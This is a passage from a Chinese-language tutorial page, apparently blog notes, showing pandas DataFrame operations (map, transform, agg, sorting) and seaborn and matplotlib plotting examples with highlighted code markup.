punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'Java'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>columns<span class="token operator">=</span>columns<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 修改一列的值，使用函数</span><span class="token comment"># 注意，不能使用sum这种使用循环实现的函数</span><span class="token keyword">def</span> <span class="token function">add_score</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> item<span class="token operator">+</span><span class="token number">10</span>df<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>add_score<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 使用lambda表达式</span><span class="token keyword">lambda</span> x <span class="token punctuation">:</span> x<span class="token operator">+</span><span class="token number">10</span>df<span class="token punctuation">[</span><span class="token string">'Java'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'Java'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> item <span class="token punctuation">:</span> item<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="transform-函数"><a href="#transform-函数" class="headerlink" title="transform()函数"></a>transform()函数</h4><p><strong>和map()类似</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">transform_func</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> item<span class="token operator">+</span><span class="token number">10</span>df<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>transform<span class="token punctuation">(</span>transform_func<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>练习：</strong></p><p> 新增两列，分别为张三、李四的成绩状态，如果分数低于90，则为”failed”，如果分数高于120，则为”excellent”，其他则为”pass”</p><p>  【提示】使用函数作为map的参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'李四'</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'王五'</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">]</span><span class="token punctuation">]</span>score <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transform_score</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> item <span class="token operator">&lt;</span> <span class="token number">90</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'failed'</span>    <span class="token keyword">elif</span> item <span class="token operator">&lt;</span> <span class="token number">120</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'passed'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'excellent'</span>score<span class="token punctuation">[</span><span class="token string">'成绩'</span><span class="token punctuation">]</span> <span class="token operator">=</span> score<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>transform_score<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="agg-函数"><a href="#agg-函数" class="headerlink" title="agg()函数"></a>agg()函数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pdfoods_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'食品名'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'肚脐饼'</span><span class="token punctuation">,</span> <span class="token string">'水晶饺'</span><span class="token punctuation">,</span> <span class="token string">'擂茶'</span><span class="token punctuation">,</span> <span class="token string">'肚脐饼'</span><span class="token punctuation">,</span> <span class="token string">'擂茶'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token string">'单价'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token string">'数量'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token string">'城市'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'潮州'</span><span class="token punctuation">,</span> <span class="token string">'汕尾'</span><span class="token punctuation">,</span> <span class="token string">'梅州'</span><span class="token punctuation">,</span> <span class="token string">'深圳'</span><span class="token punctuation">,</span> <span class="token string">'深圳'</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 将【数量】列的“-”统一替换为 0；</span><span class="token keyword">def</span> <span class="token function">replace_info</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">return</span> datafoods_df<span class="token punctuation">[</span><span class="token string">'数量'</span><span class="token punctuation">]</span> <span class="token operator">=</span> foods_df<span class="token punctuation">[</span><span class="token string">'数量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>agg<span class="token punctuation">(</span>replace_info<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>foods_df<span class="token punctuation">)</span><span class="token comment"># 同时计算【单价】列的最小值和【数量】列的最大值</span><span class="token keyword">print</span><span class="token punctuation">(</span>foods_df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'食品名'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>agg<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'单价'</span><span class="token punctuation">:</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'数量'</span><span class="token punctuation">:</span> <span class="token string">'max'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><h4 id="take排序"><a href="#take排序" class="headerlink" title="take排序"></a>take排序</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># take()函数接受一个索引列表，用数字表示</span><span class="token comment"># axis指定维度,axis=0是index，axis=1是column，别忘了column也可以通过隐藏索引012</span><span class="token comment"># axis=1的时候，可以列表长度可以少于列数，但是axis=0不行</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">230</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'Tom'</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'Java'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>columns<span class="token operator">=</span>columns<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment">#可以借助np.random.permutation()函数随机排序</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>take<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>permutation<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># sort_values排序</span><span class="token comment"># ascending是否按照从小到大</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">,</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sort-values排序"><a href="#sort-values排序" class="headerlink" title="sort_values排序"></a>sort_values排序</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pdhumans_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'姓名'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'小猿'</span><span class="token punctuation">,</span> <span class="token string">'小马'</span><span class="token punctuation">,</span> <span class="token string">'小鱼'</span><span class="token punctuation">,</span> <span class="token string">'小猫'</span><span class="token punctuation">,</span> <span class="token string">'小龙'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token string">'身高'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'165'</span><span class="token punctuation">,</span> <span class="token string">'170'</span><span class="token punctuation">,</span> <span class="token string">'160'</span><span class="token punctuation">,</span> <span class="token string">'172'</span><span class="token punctuation">,</span> <span class="token string">'178'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token string">'体重'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># sort_values排序</span><span class="token comment"># ascending是否按照从小到大</span><span class="token comment"># 数字字符串也可以进行排序</span>df <span class="token operator">=</span> humans_df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">'身高'</span><span class="token punctuation">,</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 只想提取出'身高'列，单独进行排序</span>df <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'身高'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 重置数据行索引</span><span class="token comment"># drop是否保留原索引,默认False</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="seaborn"><a href="#seaborn" class="headerlink" title="seaborn"></a>seaborn</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> seaborn <span class="token keyword">as</span> sns<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> faker <span class="token keyword">import</span> Faker<span class="token keyword">import</span> randomf <span class="token operator">=</span> Faker<span class="token punctuation">(</span>locale<span class="token operator">=</span><span class="token string">'zh_CN'</span><span class="token punctuation">)</span>class_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1班'</span><span class="token punctuation">,</span><span class="token string">'2班'</span><span class="token punctuation">,</span><span class="token string">'3班'</span><span class="token punctuation">]</span>woman_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    woman_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'woman'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>man_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    man_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'man'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>student_list <span class="token operator">=</span> woman_list <span class="token operator">+</span> man_liststudent_df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>student_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>student_df<span class="token punctuation">)</span><span class="token comment"># 设置中文字体</span>sns<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">)</span><span class="token comment"># 散点图</span>sns<span class="token punctuation">.</span>scatterplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">)</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">)</span> <span class="token comment">#关系图，好像也没什么区别</span><span class="token comment"># 可选参数hue，该参数通过图中的不同颜色表示不同含义，可以让我们在图中添加一个维度</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'sex'</span><span class="token punctuation">)</span><span class="token comment"># 可选参数 size，它会根据传入数据的大小在散点图中生成大小不同的点</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'sex'</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">)</span><span class="token comment"># 可选参数是style，它可以在某一维度上，用点的不同形状区分数据</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'sex'</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token string">'class'</span><span class="token punctuation">)</span><span class="token comment"># 柱状图</span>sns<span class="token punctuation">.</span>barplot<span class="token punctuation">(</span>data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'class'</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">)</span><span class="token comment"># 折线图</span>sns<span class="token punctuation">.</span>lineplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">)</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'line'</span><span class="token punctuation">)</span><span class="token comment"># 直方图</span>sns<span class="token punctuation">.</span>histplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">)</span><span class="token comment"># 灰色是重合的部分</span>sns<span class="token punctuation">.</span>histplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>student_df<span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'sex'</span><span class="token punctuation">)</span><span class="token comment"># matplotlib</span>student_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'scatter'</span><span class="token punctuation">)</span>student_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'line'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><h2 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 设置图大小</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 设置标题</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 设置x轴标签</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 设置y轴标签</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token comment"># 设置x轴文字旋转</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>students_grade <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'李健'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                               <span class="token string">'王聪'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                               <span class="token string">'过凡'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">]</span>                              <span class="token punctuation">}</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2月'</span><span class="token punctuation">,</span> <span class="token string">'3月'</span><span class="token punctuation">,</span> <span class="token string">'4月'</span><span class="token punctuation">,</span> <span class="token string">'5月'</span><span class="token punctuation">,</span> <span class="token string">'6月'</span><span class="token punctuation">,</span> <span class="token string">'7月'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 绘制多条折线图</span><span class="token comment"># df.plot() 默认会将每一列数据用绘制成单条折线图，然后合并到同一张图上</span><span class="token comment"># 如果那一列数据不是数字类型，将无法绘制</span><span class="token comment"># figsize可以设置图标的大小（宽，高）</span><span class="token comment"># rot可以将y轴的刻度逆时针旋转</span><span class="token comment"># grid设置网格线</span>students_grade<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'line'</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'月考成绩'</span><span class="token punctuation">,</span>rot<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span>grid<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>students_grade<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>grade_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'班级'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token 